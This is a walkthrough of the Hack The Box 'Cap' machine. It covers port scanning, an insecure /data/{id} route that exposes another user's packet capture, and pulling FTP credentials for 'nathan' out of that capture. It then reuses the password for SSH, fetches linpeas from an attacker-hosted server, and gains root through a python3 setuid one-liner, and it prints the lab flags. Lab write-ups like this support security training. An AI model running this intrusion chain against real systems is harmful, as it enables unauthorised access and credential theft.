# Hack The Box - Machienes - Cap


### Task 1 

- How many TCP ports are open?

- Answer: 3 ( Open Ports 21,22,80 )

sudo nmap 10.129.3.89 -sT -sV -sC -O -oN nmap-initial-scan.txt

sudo nmap 10.129.3.89 -sT -sV -sC -O -p- -oN nmap-full-port-scan.txt

gobuster dir -url http://10.129.3.89 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -o gobuster-dir-scan.txt


### Task 2

- After running a "Security Snapshot", the browser is redirected to a path of the format /[something]/[id], where [id] represents the id number of the scan. What is the [something]?

- Answer: data

### Task 3

- Are you able to get to other users' scans?

- Answer: Yes

If we go to capture we get redirected to /data/{id} and we can download the .pcap file

### Task 4

- What is the ID of the PCAP file that contains sensative data?

- Answer: 0

Since we have the /data/{id} route on the website the first logical step would be to go -1 from the initial zero which is 0. We are presented with the page and we can download the file.

### Task 5

- Which application layer protocol in the pcap file can the sensetive data be found in?

- Answer: ftp

If we investigate the 0.pcap file with cat we can search throught it. We can see alot of giberish because of the encoding and we can use tcp dump to put it into "clear text".

- Command: tcpdump -A -r 0.pcap > 0.txt

After this we can see alot of FTP activity in the sensitive file. So we investigate with the commands below.

- Command: cat 0.txt | grep "pass"

- Command: cat 0.txt | grep "ssh"

- Command: cat 0.txt | grep "user"

- Command: cat 0.txt | grep "ftp"

Since the largest portion of the grepped result is for ftp we can be sure that ftp is the answer in question. 

- Command: cat 0.txt | grep "PASS"

- Command: cat 0.txt | grep "USER"

- User FTP: nathan

- Password FTP: Buck3tH4TF0RM3! | PASS Buck3tH4TF0RM3!

### Task 6

- We've managed to collect nathan's FTP password. On what other service does this password work?

- Answer: ssh ( Easy conclusion since we had it open in the nmap scan )

- Command: ssh nathan@TARGET_IP

- Command: ls

We find the user.txt file and after the cat we find the user flag.

- User Flag: ba0d90f66408393eb29055953d2c07f4


### User Flag

- ba0d90f66408393eb29055953d2c07f4

### Task 8

- What is the full path to the binary on this machine has special capabilities that can be abused to obtain root privileges?

- Answer: /usr/bin/python3.8

So the question requires more investigation of the target machiene. First we can run linpeas.sh

- Command ( HOST ): cp /usr/share/peass/linpeas/linpeas.sh .

- Command ( HOST ): python3 -m http.server 8000

- Command ( TARGET ): curl -O http://10.10.16.105:8000/linpeas.sh

- Command ( TARGET ): chmox +x ./linpeas.sh

- Command ( TARGET ): ./linpeas.sh

I could not find anything from the LINPEAS output so I searched further.

- Command ( TARGET ): getcap -r / 2>/dev/null

We get the python3 binary returnet in the output which is the correct answer.

So since we can use python let's abuse it.

- Command ( TARGET ): python3 -c 'import os; os.setuid(0); os.execl("/bin/sh", "sh")'

### Root Flag

231acb99824d57ca2bac183a4f62d678
